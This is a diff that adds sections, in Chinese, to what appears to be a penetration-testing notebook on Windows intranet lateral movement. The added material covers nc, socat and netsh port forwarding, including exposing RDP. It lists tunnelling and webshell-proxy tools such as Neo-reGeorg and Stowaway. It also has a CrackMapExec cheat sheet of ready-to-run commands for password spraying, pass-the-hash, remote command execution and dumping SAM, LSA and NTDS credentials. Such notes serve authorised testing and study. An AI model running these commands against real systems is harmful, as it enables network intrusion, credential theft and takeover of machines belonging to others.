@@ -44,6 +44,30 @@ windwos内网横穿
 
 端口转发
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ nc
+	- 端口扫描
+		+ 默认TCP：``nc -z -v -n 172.31.100.7 21-25``
+	- 端口转发
+		+ 将本地9000端口数据转发到192.168.100.2/8000：``mkfifo tmp/fifo|cat /tmp/fifo | nc 192.168.100.2 8000 | nc -l 9000 > /tmp/fifo`` 
+		+ 访问：``nc -n 192.168.1.102 9000`` 
++ socat
+	- 显示本地文件
+		+ ``socat - /etc/sysctl.conf`` 
+	- 监听本地端口
+		+ ``socat TCP-LISTEN:12345 -`` 
+	- UNIX DOMAIN域套接字转成TCP SOCKET
+		+ ``socat TCP-LISTEN:12345,reuseaddr,fork UNIX-CONNECT:/data/deCOREIDPS/unix.domain`` 
+	- 端口转发
+		+ ``对于所有15000端口的TCP访问，一律转发到 server.wesnoth.org:15000 上`` 
+		+ ``socat -d -d -lf /var/log/socat.log TCP4-LISTEN:15000,reuseaddr,fork,su=nobody TCP4:server.wesnoth.org:15000`` 
+		+ ``tcp：nohup socat TCP4-LISTEN:2333,reuseaddr,fork TCP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
+		+ ``udp：nohup socat UDP4-LISTEN:2333,reuseaddr,fork UDP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
++ netsh
+	- 前提：IP Helper服务必须启动；管理员权限；
+	- 查看已存在端口转发：``netsh interface portproxy show all``
+	- 增加监听8888端口转发到3389端口：``netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectaddress=0.0.0.0 connectport=3389``
+	- 删除转发端口：``netsh interface portproxy del v4tov4 listenport=8888 listenaddress=0.0.0.0``
+	- 删除所有转发端口：``netsh interface portproxy reset``
 + portfwd
 	- MSF自带工具
 	- 将192.168.100.4的8888端口，映射到当前主机的8899端口
@@ -85,6 +109,26 @@ windwos内网横穿
 			socks5 172.20.0.59 7222
 			在172.20.0.1/24网段机器使用nmap直接对内网128网段进行扫描：
 			proxychains nmap -sT -Pn -p- 128.0.0.1/24
+	- 相关问题
+		+ frpc客户端连接会提示 login to server failed: EOF
+			::
+			
+				修改frpc.ini文件，在common节点，添加tls_enable = true
++ NPS【综合】
+	- 一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发。
+	- 访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析、内网socks5代理等等，并带有功能强大的web管理端。
+	- 项目地址：``https://github.com/ehang-io/nps``
+	- 帮助文档：``https://ehang.io/nps/documents``
++ Goproxy 【综合】
+	- Goproxy 是 golang 实现的高性能 http ,https ,websocket ,tcp ,socks5 代理服务器。
+	- 项目地址：``https://github.com/snail007/goproxy``
+	- 帮助文档：``https://snail007.host900.com/goproxy/manual/zh/#/``
++ Stowaway【多级】
+	- Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具。
+	- 项目地址：``https://github.com/ph4ntonn/Stowaway``
++ Neo-reGeorg【Webshell】
+	- Neo-reGeorg 是一个旨在积极重构 reGeorg 的项目。
+	- 项目地址：``https://github.com/L-codes/Neo-reGeorg``
 
 域渗透
 --------------------------------
@@ -161,6 +205,66 @@ windwos内网横穿
 
 相关工具
 --------------------------------
+
+CrackMapExec 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 地址：``https://github.com/byt3bl33d3r/CrackMapExec``
++ 安装
+	::
+	
+		最方便：
+		apt-get install crackmapexec
+		避免有坑：
+		apt-get install -y libssl-dev libffi-dev python-dev build-essential
+		pip install --user pipenv
+		git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
+		cd CrackMapExec && pipenv install
+		pipenv shell
+		python setup.py install
++ 说明
+	- 帮助：``crackmapexec --help``
+	- 根据协议获取帮助信息：``crackmapexec smb --help``
+	- 基本探测
+		::
+		
+			crackmapexec protocol test.com
+			crackmapexec protocol 192.168.3.70/24
+			crackmapexec protocol 192.168.3.70-77  192.168.4.1-20
+			crackmapexec protocol ~/ip.txt
+	- 携带认证信息
+		::
+		
+			crackmapexec protocol 192.168.3.70 -u administrator -p 'admin!@#45'
+			crackmapexec protocol 192.168.3.70 -u='-administrator' -p='-admin!@#45'   //第一个字母为-的特殊情况语句
+	- 协议探测：``crackmapexec  smb 192.168.3.73-76``
+	- 密码喷射
+		::
+		
+			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45'
+			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' 'Admin12345'
+			crackmapexec smb 192.168.3.73-144 -u administrator  sqladmin -p 'admin!@#45' 'Admin12345'
+			crackmapexec smb 192.168.3.73-144 -u ~/name.txt -p ~/pass.txt
+			crackmapexec smb 192.168.3.73-144 -u ~/name.txt -H ~/ntlmhash.txt
+			crackmapexec smb 192.168.3.73-144 -u user -H 'NTHASH'
+			crackmapexec smb 192.168.3.73-144 -u user -H 'LMHASH:NTHASH'
+	- 执行命令：``crackmapexec smb 192.168.3.144 -u administrator -p 'admin!@#45' -x whoami``
+	- 凭证获取
+		::
+		
+			crackmapexec smb 192.168.3.144 -u administrator -p 'admin!@#45' --sam
+			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --lsa
+			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --ntds
+			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --ntds vss
+			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --ntds-history
+	- Sessions枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --sessions``
+	- 共享枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --shares``
+	- 磁盘枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --disk``
+	- 登录用户枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --loggedon-users``
+	- RID爆破枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --rid-brute``
+	- 域用户枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --users``
+	- 组枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --groups``
+	- 本地组枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --local-groups``
+	- 域密码策略枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --pass-pol``
 
 Impackt
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
